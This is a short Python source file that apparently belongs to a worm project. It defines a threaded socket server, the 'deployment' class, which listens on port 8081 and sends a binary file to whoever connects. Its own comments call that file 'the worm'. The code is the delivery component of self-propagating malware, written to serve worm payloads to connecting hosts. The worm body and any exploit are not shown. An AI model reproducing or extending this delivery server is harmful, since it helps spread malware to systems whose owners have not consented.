import socket
import threading

class deployment(threading.Thread):

    # initialize the deployment socket server
    def __init__(self,host="0.0.0.0",port=8081, data=None):
        self.serversocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.host = host
        self.port = port
        self.serversocket.bind((host,port))
        self.serversocket.listen(5)
        self.data = data
        print("Deployment Server listening on port", self.port)
        super().__init__()

    # start the thread
    def run(self):
        clientsocket,addr = self.serversocket.accept()
        print("Got a connection from", addr)
        try:
            # read the worm in bytes
            binary_content = self.data.read()
            chunk_size = 1024
            d = len(binary_content)
            # send the worm over in pieces
            for i in range(0, len(binary_content), chunk_size):
                clientsocket.sendall(binary_content[i:i+chunk_size])
        except FileNotFoundError:
            clientsocket.sendall(b'File not found')
        except Exception:
            print("error on deploy:")
        clientsocket.close()
    
    def close_conenction(self):
        self.serversocket.close()
        